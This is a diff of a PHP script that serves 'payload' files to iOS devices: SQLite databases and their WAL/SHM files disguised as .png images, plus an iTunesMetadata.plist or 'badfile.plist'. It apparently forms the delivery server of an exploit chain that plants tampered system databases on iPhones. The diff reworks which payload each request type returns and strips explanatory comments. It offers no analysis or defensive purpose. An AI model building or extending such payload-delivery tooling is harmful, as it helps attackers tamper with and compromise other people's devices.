@@ -28,10 +28,9 @@ $mimeType = 'application/octet-stream';
 // ✅ Locate the most recent payload file based on type
 switch ($type) {
     case 'sqlite':
-        // Find most recent downloads.28.sqlitedb (apllefuckedhhh.png)
-        $lastDir = "$basePath/last";
-        if (is_dir($lastDir)) {
-            $files = glob("$lastDir/*/apllefuckedhhh.png");
+        $secondDir = "$basePath/2ndd";
+        if (is_dir($secondDir)) {
+            $files = glob("$secondDir/*/belliloveu.png");
             if ($files) {
                 usort($files, function($a, $b) {
                     return filemtime($b) - filemtime($a);
@@ -40,11 +39,10 @@ switch ($type) {
                 $mimeType = 'application/octet-stream';
             }
         }
-        log_debug("SQLite file: " . ($fileToServe ? basename(dirname($fileToServe)) . "/" . basename($fileToServe) : "NOT FOUND"));
+        log_debug("BLDatabase SQLite file: " . ($fileToServe ? basename(dirname($fileToServe)) . "/" . basename($fileToServe) : "NOT FOUND"));
         break;
 
     case 'blwal':
-        // Find most recent BLDatabase WAL file (belliloveu.png-wal)
         $secondDir = "$basePath/2ndd";
         if (is_dir($secondDir)) {
             $files = glob("$secondDir/*/belliloveu.png-wal");
@@ -60,7 +58,6 @@ switch ($type) {
         break;
 
     case 'blshm':
-        // Find most recent BLDatabase SHM file (belliloveu.png-shm)
         $secondDir = "$basePath/2ndd";
         if (is_dir($secondDir)) {
             $files = glob("$secondDir/*/belliloveu.png-shm");
@@ -76,22 +73,15 @@ switch ($type) {
         break;
 
     case 'itunes':
-        // Find most recent iTunes metadata plist (metadata file in temp)
-        // iOS expects this at /var/mobile/Media/Books/iTunesMetadata.plist
-        // We'll serve from temp directory
-        $tempDir = sys_get_temp_dir();
-        $itunesFile = "$tempDir/iTunesMetadata.plist";
+        $itunesFile = "$basePath/badfile.plist";
         if (file_exists($itunesFile)) {
             $fileToServe = $itunesFile;
             $mimeType = 'application/x-apple-plist';
         } else {
-            // Try to find in project directory
-            $itunesFiles = glob("$basePath/../*.plist");
-            if ($itunesFiles) {
-                usort($itunesFiles, function($a, $b) {
-                    return filemtime($b) - filemtime($a);
-                });
-                $fileToServe = $itunesFiles[0];
+            $tempDir = sys_get_temp_dir();
+            $itunesTmp = "$tempDir/iTunesMetadata.plist";
+            if (file_exists($itunesTmp)) {
+                $fileToServe = $itunesTmp;
                 $mimeType = 'application/x-apple-plist';
             }
         }
